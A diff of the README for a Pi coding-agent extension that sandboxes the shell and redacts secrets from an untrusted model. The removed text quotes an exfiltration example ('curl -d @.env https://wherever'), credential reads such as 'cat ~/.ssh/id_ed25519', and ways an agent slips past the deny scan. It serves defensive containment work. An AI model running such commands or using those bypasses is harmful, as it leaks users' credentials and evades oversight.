@@ -1,30 +1,21 @@
 # pi-sandboxing
 
-Pi extension. Puts your home-directory credentials out of the shell's reach, asks before a tool opens your `.env`, and keeps secret values out of the model's context when something reads one anyway. Zero runtime dependencies.
+Pi extension that keeps configured secrets out of model-controlled file tools and shell commands. Strict mode also removes inherited credentials, hides the host filesystem, and denies network access. The package has no runtime dependencies.
 
-Pi ships no sandbox. `read`, `grep` and `bash` resolve whatever they are handed, `~/.ssh/id_ed25519` included. A deny list on the file tools alone would be theatre, because the model that gets refused on `.env` runs `cat .env` next, or greps the repo for the value, or prints `process.env`.
+## Threat model
 
-So this is one deny list enforced in three places.
+The model and loaded skills are untrusted. Pi, installed extensions, and tool implementations are trusted. An extension runs inside Pi with the user's permissions, so this package cannot contain a malicious extension.
 
-| Where | What it does | What it cannot do |
-| --- | --- | --- |
-| OS profile | Denies `~/.ssh`, `~/.aws` and `~/.gnupg` to every bash subprocess, at the kernel | Reach Pi's own tools; filter the network |
-| Gate | Asks you before `read`, `edit`, `write`, `grep` or `find` touches a rule-matching path | See inside a shell command |
-| Redactor | Replaces harvested secret values in everything leaving a tool | Catch a secret it never harvested |
+Strict mode provides this boundary:
 
-```
-read wants /Users/you/app/.env, which is gated
-  → Allow once, this call only
-    Deny
-```
+- Pi file tools cannot read or modify configured secret paths.
+- Shell commands cannot read configured workspace secrets that existed before the command, or the user's home directory.
+- Shell commands receive an allowlisted environment with a synthetic `HOME`.
+- Shell commands cannot use Internet, loopback, or other network connections.
+- SSH agent, Docker, cloud CLI, and similar host sockets are not inherited or mounted. Existing Unix sockets inside mounted workspace and toolchain paths are masked.
+- The workspace remains writable except for protected targets.
 
-Deny, and the model is told to ask you instead. Allow, and it sees the file in full. Do neither, and the values read like this wherever they surface:
-
-```
-$ cat .env
-DB_PASS=[redacted: DB_PASS]
-PORT=3000
-```
+The redactor remains as backup protection. It is not the security boundary for shell execution.
 
 ## Install
 
@@ -32,80 +23,92 @@ PORT=3000
 pi install pi-sandboxing
 ```
 
-No `dependencies`. Two host-provided peers that any Pi install already ships: `@earendil-works/pi-coding-agent` and `@earendil-works/pi-tui`.
+macOS uses `/usr/bin/sandbox-exec`. Linux requires [Bubblewrap](https://github.com/containers/bubblewrap), normally installed as `bwrap`. If the backend is missing or the configuration cannot be parsed, strict mode blocks shell commands rather than running them without isolation.
 
-On macOS the jail uses `/usr/bin/sandbox-exec`, which is present on every install. On Linux it uses `bwrap` from [bubblewrap](https://github.com/containers/bubblewrap), which you may need to install. Without either, the jail is off and the status line says so; the gate and the redactor still work.
+Windows and other unsupported platforms still block protected file tools, but strict shell commands are unavailable.
 
-## The jail
+## Strict shell
 
-At session start the rules that point into your home directory become a profile: SBPL for `sandbox-exec`, arguments for `bwrap`. Every bash command, and every `!` command you type yourself, runs under it.
+Strict mode is the default at every session start and reload. It applies to the model-callable `bash` tool and to `!` or `!!` commands typed inside Pi. The `powershell` tool is blocked because this package has no strict PowerShell backend.
 
+Each command gets:
+
+- The real workspace mounted read-write.
+- Every existing protected file, directory, symlink target, and hard-link alias masked from the process.
+- A private temporary directory and synthetic home directory.
+- System libraries and allowlisted home toolchains discovered from `PATH`, mounted read-only. Non-system toolchain roots are scanned for protected targets and host sockets before mounting.
+- A new environment containing only `PATH`, `HOME`, `TMPDIR`, `SHELL`, locale, terminal settings, and `CI`.
+- No network namespace on Linux and a network-denying SBPL rule on macOS.
+
+Protected targets are checked again before every command. Directory metadata caches unchanged trees, while entry changes trigger a full rescan. If discovery or profile generation fails, that command does not run. An unreadable nested directory is masked as a whole. A transient discovery failure while checking a file tool blocks that call but does not disable strict shell for the rest of the session.
+
+Model-visible `!` output is buffered until the command exits so a secret split across output chunks cannot bypass redaction. Use a separate terminal when live progress is required.
+
+Commands that need package downloads, remote Git access, project credentials, local servers, or the real home directory should run in a separate terminal.
+
+## Protected file tools
+
+`read`, `edit`, `write`, `grep`, `find`, `ffgrep`, `fffind`, and configured path tools are checked in Pi's `tool_call` hook. Matching calls are always denied. There is no approval dialog.
+
+The check uses both the path as written and its canonical target. It refreshes hard-link aliases before every file-tool call, so a protected `.env` cannot be read through an ordinary filename linked to the same file. Pi's leading `@` path shorthand is normalized before matching.
+
+Recursive content searches are denied when their root contains a protected target. `ls`, `find`, and `fffind` may list protected filenames, but they do not read file contents.
+
+## Unrestricted shell
+
+Run `/sandboxing` and choose `Use unrestricted shell` when a command must have normal host access. Pi requires this exact phrase:
+
+```text
+ENABLE UNRESTRICTED SHELL
 ```
-$ cat ~/.ssh/id_ed25519
-cat: /Users/you/.ssh/id_ed25519: Operation not permitted
+
+Unrestricted shell commands regain the host filesystem, environment, sockets, and network. A persistent red status line remains visible. The mode lasts only for the current session. Reloading, starting, resuming, or forking a session restores strict mode.
+
+Protected file tools remain denied, and output redaction remains active. Unrestricted shell is still capable of sending a secret directly over the network without printing it. The redactor cannot stop that.
+
+## Redaction
+
+At session start, the extension harvests values from rule-matching files inside the workspace. When those values appear in tool output or assistant text, it replaces them with labelled placeholders:
+
+```text
+DB_PASS=[redacted: DB_PASS]
 ```
 
-No dialog, no appeal. A kernel refusal is reported to the model with the reason and nothing is retried, because re-running a command replays whatever already happened: `rm -rf build && cat .env` would delete `build` twice.
+Values shorter than eight characters, pure numbers, booleans, and common development words are ignored. Exact substring matching means transformed, split, encoded, or previously unknown values may not be caught.
 
-The profile is a denylist, not a cwd jail. Two reasons. `(deny default)` aborts the process outright, since dyld needs more than is obvious, and a working allowlist breaks `npm` on any machine whose version manager lives in your home directory, which is most of them.
+`.env.example`, `.env.sample`, `.env.template`, `.env.dist`, and equivalent suffixes are excluded because they normally contain public example values.
 
-**Repo-local secrets stay readable by the shell.** Denying them would break every project that loads its own `.env`, which is your test suite and your dev server. The redactor covers those instead.
+User messages are not redacted. If the user pastes a credential into the conversation, the model already has it.
 
-Only rules naming a location reach the profile. `.npmrc` and `.netrc` are filename rules, so they are gated and redacted everywhere but not denied at the kernel. `~/.npmrc` is deliberately not a default rule either: npm reads it for registry auth, and denying it would break `npm install`.
+## Default rules
 
-### git over SSH
+The built-in rules cover:
 
-Denying `~/.ssh` is the point of the jail, and it is also how git authenticates. Load a key into `ssh-agent` once per boot and both work:
+- `.env` and `.env.*`
+- `*.pem` and `*.key`
+- `id_rsa*` and `id_ed25519*`
+- `credentials.json` and `service-account*.json`
+- `.npmrc` and `.netrc`
+- `~/.aws/`, `~/.ssh/`, `~/.gnupg/`, and Cargo credentials
+- `~/.docker/`, `~/.kube/`, and `~/.azure/`
+- `~/.config/gcloud/` and `~/.config/gh/`
 
-```sh
-ssh-add ~/.ssh/id_ed25519
-```
-
-The agent socket stays reachable from inside the jail, and signing happens in the agent rather than in your shell, so `git push` works while the key file itself is unreadable to every command the agent runs. Without a loaded key, expect `git push` over SSH to fail inside Pi; push from your own terminal instead.
-
-## The gate
-
-Pi's `read`, `edit`, `write`, `grep` and `find` run inside the Node process, where no kernel profile reaches them. So they get asked about instead, on their `path` argument. `ls` is not gated: a listing that shows `.env` exists leaks nothing.
-
-Allowing records nothing. The next call on the same path asks again. There is no session grant and no way to write one to disk, because a recorded allow on `.env` is a gate that has been quietly switched off.
-
-`bash` also gets its command scanned for rule-matching tokens. The split breaks on shell punctuation, so `cat $(echo .env)` is caught too. It loses to `tar czf /tmp/a .`, which names no secret, and to `cat $SECRET`, where the path only exists once the shell has run.
-
-## The redactor
-
-At session start every rule-matching file inside your working directory is harvested. Its values become needles, each labelled from the key where the format has one: `KEY=value` for dotenv, the key path for JSON, the file for a PEM body. Anything leaving a tool, a `!` command, or the model's own message has those needles replaced by placeholders.
-
-Values under 8 characters are dropped, along with pure digits, booleans, and the words that fill every `.env`: `true`, `local`, `development`, `postgres`, `localhost`. Nothing can tell a 4-character password from a port number.
-
-`.env.example` and its kin are excluded from the rules entirely. They are committed files full of fake values, and harvesting them would make `changeme` a needle that redacts half your output.
-
-Your own typing is never redacted. Handing the agent a credential on purpose stays possible.
-
-### How allowing and redacting agree
-
-Approving a read burns that file's needles before the tool runs, so the redactor handles the approved call by finding nothing left to do. One set of strings, mutated by the gate and read by the redactor, and no call bookkeeping between them.
-
-A burned needle stays burned for the session. Once the model holds a value, redacting its echo protects nothing and leaves a transcript where the file shows a password and the sentence about the file shows a placeholder.
-
-## What is in the rules by default
-
-`.env` and `.env.*`, `*.pem`, `*.key`, `id_rsa*`, `id_ed25519*`, `credentials.json`, `service-account*.json`, `.npmrc`, `.netrc`, and the directories `~/.aws`, `~/.ssh`, `~/.gnupg`.
-
-Only the home-directory entries reach the profile. Only the files inside your working directory are harvested. Everything is gated.
+Filename rules apply anywhere. Location rules resolve from the workspace or home directory.
 
 ## Configuration
 
-`pi-sandboxing.json`, read from `~/.pi/agent/` and then from the workspace's `.pi/`. Every key is optional.
+The extension reads `pi-sandboxing.json` first from Pi's agent directory and then from the trusted workspace's `.pi/` directory.
 
 | Key | Default | Meaning |
 | --- | --- | --- |
-| `enabled` | `true` | `false` turns the whole extension off. |
-| `rules` | `[]` | Extra globs to gate, harvest and jail. Added to the builtins. |
-| `unguard` | `[]` | Builtin globs to remove. Honoured in the global file only. |
-| `stoplist` | `[]` | Extra values to treat as noise. Added to the builtins. |
-| `gatedTools` | `{}` | Extra tool names mapped to the argument holding their path. |
+| `rules` | `[]` | Additional globs to protect, harvest, and mask. |
+| `unguard` | `[]` | Built-in globs to remove. Accepted only in global configuration. |
+| `stoplist` | `[]` | Additional harvested values to treat as noise. |
+| `gatedTools` | `{}` | Extra tool names mapped to the input field containing their path. |
 
-Both layers can add. Only the global file can take a rule away, and the workspace layer is read only for a trusted project, so a repository you just cloned cannot un-gate itself by shipping a `.pi/pi-sandboxing.json`.
+The old `enabled` key is ignored with a warning. Shell relaxation is session-only through `/sandboxing`.
+
+Both configuration layers may add protection. Only global configuration may remove a built-in rule. Pi reads workspace configuration only after the project is trusted.
 
 ```sh
 mkdir -p ~/.pi/agent && cat > ~/.pi/agent/pi-sandboxing.json <<'EOF'
@@ -113,36 +116,38 @@ mkdir -p ~/.pi/agent && cat > ~/.pi/agent/pi-sandboxing.json <<'EOF'
 EOF
 ```
 
-Then `/reload`. Pi re-emits `session_start`, which is when rules are read, files are harvested and the profile is generated.
+Run `/reload` after changing configuration. A malformed file leaves Pi running but blocks strict shell execution until fixed.
 
-## Commands
+## `/sandboxing`
 
-| Command | What it does |
-| --- | --- |
-| `/sandboxing` | Shows the active rules, whether the jail is on, how many needles are loaded, and what has been redacted or burned this session. |
+The command opens a menu with these actions:
 
-Nothing allows a path from the command line, because there is nothing to record. There is no flag and no hotkey to turn the sandbox off either: a guard with a toggle is a guard that gets switched off at 2am and stays off, so switching it off is a deliberate edit to the config file.
+- Show the active backend, rules, and redaction counts.
+- Switch back to strict shell.
+- Enable unrestricted shell after typed confirmation.
 
-The command name is namespaced on purpose. Pi resolves two extensions registering the same name by renaming both to `/name:1` and `/name:2` without telling anyone.
+The command name is namespaced because Pi renames duplicate extension commands with numeric suffixes.
+
+## Platform details
+
+### macOS
+
+The profile imports Apple's `bsd.sb` process baseline, then revokes broad file reads, file writes, and all network access. It grants reads to system and detected toolchain paths, grants workspace access, and denies protected targets after those grants. Access to the common Security and Trust daemon services is denied explicitly.
+
+`sandbox-exec` is deprecated and undocumented. OS updates may break commands that need an unlisted service. Such failures stay closed rather than falling back to an unrestricted command.
+
+### Linux
+
+Bubblewrap creates new user, process, IPC, UTS, and network namespaces. It starts from an empty root, recreates merged `/usr` links such as `/bin` and `/lib64`, mounts system and toolchain paths read-only, and overlays protected files or directories. A small set of loader and identity files under `/etc` is mounted read-only instead of exposing the whole directory. User namespaces or a setuid Bubblewrap installation must be available.
 
 ## Limits
 
-**No network filtering.** Domain-level control needs a SOCKS proxy with TLS interception, which is four dependencies and a ripgrep requirement. `curl -d @.env https://wherever` reaches the internet, and only fails on files the jail covers. If you want that, use [pi-sandbox](https://github.com/carderne/pi-sandbox), which does it properly.
-
-**Not a cwd jail.** A sibling checkout stays readable from the shell. [pi-dir-permission](../pi-dir-permission) covers that for Pi's own tools, and nothing covers it for bash.
-
-**The token scan is a courtesy.** It reads the command as text, so a path set by an earlier command and used as `cat $SECRET` gets through, as does any command that names no path at all. The redactor catches the output, which is the point.
-
-**A secret under 8 characters passes through.**
-
-**Approving a read is permanent.** The value lands in the session file on disk and is resent with every following turn. What the model sees and what Pi persists are one object, so this cannot be softened.
-
-**`bash` spills truncated output to a file.** Pi writes the full text to a temp path when output is long, and that copy is not redacted. Nothing reaches the model through it, since any read of that file passes through the redactor, but the copy exists until your temp directory is cleared.
-
-**Redaction over-matches.** Needles are plain substrings, longest first, so a value that appears inside unrelated text takes the placeholder with it. A mangled log line costs a squint; a missed secret costs the secret.
-
-**Headless runs allow gated calls.** In RPC, JSON and print mode there is nobody to ask, so the read proceeds and the redactor covers it. The gate exists for your attention, and unattended there is none to interrupt.
-
-**Two dialogs are possible.** A read of `~/.ssh/id_rsa` is outside the workspace and matches a rule, so with pi-dir-permission installed you are asked twice. Either refusal blocks the call.
-
-**This does not contain a hostile agent.** It puts your credentials out of casual reach and keeps them out of the transcript. An agent actively trying to exfiltrate has the network and a thousand ways to encode a string.
+- Installed extensions and tool implementations remain trusted code.
+- The model can read ordinary workspace source and send it through trusted network-capable tools. This package protects configured secrets, not the whole repository.
+- A rule added after a session starts needs `/reload` before file tools use it.
+- A strict command may create a new rule-matching file and read it during that same command. The file contains data produced by that already-running command; pre-existing matching files remain masked.
+- Strict commands cannot use package registries, Git remotes, localhost servers, SSH agents, Docker, or cloud credential helpers.
+- Toolchains found through `PATH` are exposed read-only. Home-directory entries are limited to known layouts for nvm, fnm, Volta, Bun, Cargo, Go, pnpm, `.local/bin`, and `~/bin`. Unknown home-directory entries are removed from strict `PATH`. Fixed system roots such as `/usr` and `/nix/store` are not recursively scanned for filename-only rules. Explicit absolute rules under those roots are still masked. A deliberately hostile executable already present there is outside this threat model.
+- Redaction ignores short and transformed secrets and can over-match ordinary output.
+- Pi may save the unredacted full form of truncated Bash output in a host temporary file. Later tool reads still pass through redaction, but the temporary copy remains until the host clears it.
+- macOS uses a system baseline that permits some operating-system IPC needed to start ordinary programs. Known credential services are denied, but Apple does not document every service name.
